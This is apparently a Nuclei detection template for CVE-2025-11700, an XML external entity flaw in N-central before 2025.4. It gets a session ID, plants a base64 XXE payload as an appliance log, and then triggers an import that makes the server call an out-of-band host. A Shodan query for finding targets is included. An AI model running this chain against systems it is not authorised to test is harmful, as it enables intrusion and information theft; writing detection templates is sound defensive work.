templates/projectdiscovery-nuclei-templates__CVE-2025-11700.yaml

flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: sessionid
    part: body
    regex:
    - <SessionID[^>]*>(\d+)</SessionID>
    - <sessionId>(\d+)</sessionId>
    - <sessionID>(\d+)</sessionID>
    type: regex
  matchers:
  - condition: and
    internal: true
    type: word
    words:
    - SessionID
    - sessionHelloResponse
  - internal: true
    status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /dms/services/ServerUI HTTP/2\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    Soapaction: \"\"\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<soapenv:Envelope\
    \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Body>\n\
    \    <sessionHello>\n      <applianceID>3</applianceID>\n    </sessionHello>\n\
    \  </soapenv:Body>\n</soapenv:Envelope>\n"
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - Ok
    - Msg
  matchers-condition: and
  raw:
  - "POST /dms/services/ServerMMS HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: \"\"\n\
    Content-Type: text/xml; charset=utf-8\n\n<?xml version=\"1.0\" encoding=\"utf-8\"\
    ?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    >\n  <soapenv:Header/>\n  <soapenv:Body>\n    <ns1:applianceLogSubmit xmlns:ns1=\"\
    http://www.n-able.com/mickey\">\n      <sessionID>{{sessionid}}</sessionID>\n\
    \      <logType>NETWORK_CHECK_LOG</logType>\n      <contents>{{base64(xxe_payload)}}</contents>\n\
    \    </ns1:applianceLogSubmit>\n  </soapenv:Body>\n</soapenv:Envelope>\n"
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - "POST /dms/services/ServerUI HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: \"\"\n\
    Content-Type: text/xml; charset=utf-8\n\n<?xml version=\"1.0\" encoding=\"utf-8\"\
    ?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    >\n  <soapenv:Header/>\n  <soapenv:Body>\n    <ns1:importServiceTemplateFromFile\
    \ xmlns:ns1=\"http://www.n-able.com/mickey\">\n      <ns1:sessionId>{{sessionid}}</ns1:sessionId>\n\
    \      <ns1:customerId>1</ns1:customerId>\n      <ns1:filePath>/opt/nable/webapps/ROOT/applianceLog/network_check_log_3.log</ns1:filePath>\n\
    \    </ns1:importServiceTemplateFromFile>\n  </soapenv:Body>\n</soapenv:Envelope>\n"
id: CVE-2025-11700
info:
  author: DhiyaneshDK,horizon3ai
  description: 'N-central versions < 2025.4 are vulnerable to an XML External Entities
    injection leading to information disclosure.

    '
  impact: 'Attackers can disclose sensitive information by exploiting XML External
    Entities injection.

    '
  metadata:
    max-request: 3
    shodan-query: http.title:"N-central Login"
    verified: true
  name: N-central - XML External Entities Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-11700
  - https://github.com/horizon3ai/n-able_n-central_xxe_file_read/blob/main/ncentral_xxe_file_read.py
  remediation: 'Update to version 2025.4 or later.

    '
  severity: high
  tags: cve,cve2025,n-central,xxe,oast,oob,vkev
variables:
  rand: '{{to_lower(rand_text_alpha(10))}}'
  xxe_payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE servicetemplate\
    \ [\n<!ENTITY % xxe SYSTEM \"http://{{interactsh-url}}\">\n%xxe;\n]>\n<servicetemplate\
    \ syntaxversion=\"2.1.0.0\">\n  <name>{{rand}}</name>\n</servicetemplate>"
